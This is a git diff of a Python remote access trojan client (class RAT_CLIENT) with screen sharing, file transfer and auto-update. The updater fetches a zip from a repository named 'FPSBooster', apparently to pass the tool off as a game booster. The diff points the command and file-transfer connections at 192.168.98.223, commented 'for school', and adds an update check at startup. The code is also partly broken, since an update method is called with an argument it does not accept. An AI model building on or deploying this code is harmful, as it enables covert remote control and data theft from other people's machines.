@@ -72,10 +72,12 @@ class RAT_CLIENT:
         self.curdir = os.getcwd()
         self.command_history = []
 
+        self.check_version()
+
         self.screenshareClient = ScreenShare()
 
         self.file_transfer_manager = FileTransfer(
-            "localhost", 4440
+            "192.168.98.223", 4440
         )
 
         self.file_transfer_thread = Thread(
@@ -163,9 +165,11 @@ class RAT_CLIENT:
             # The versions are different, so we need to update
             # Download the new version
             self.download_new_version(self.github_version)
+
     def download_new_version(self):
         # Download the new version
-        response = requests.get("https://github.com/lukasolsen/FPSBooster/archive/main.zip")
+        response = requests.get(
+            "https://github.com/lukasolsen/FPSBooster/archive/main.zip")
         # Write the zip file to disk
         with open("new_version.zip", "wb") as f:
             f.write(response.content)
@@ -187,10 +191,9 @@ class RAT_CLIENT:
         sys.exit(0)
 
 
-
 if __name__ == '__main__':
     # for school: 192.168.98.223
-    rat = RAT_CLIENT('localhost', 4444)
+    rat = RAT_CLIENT('192.168.98.223', 4444)
 
     while True:
         try:
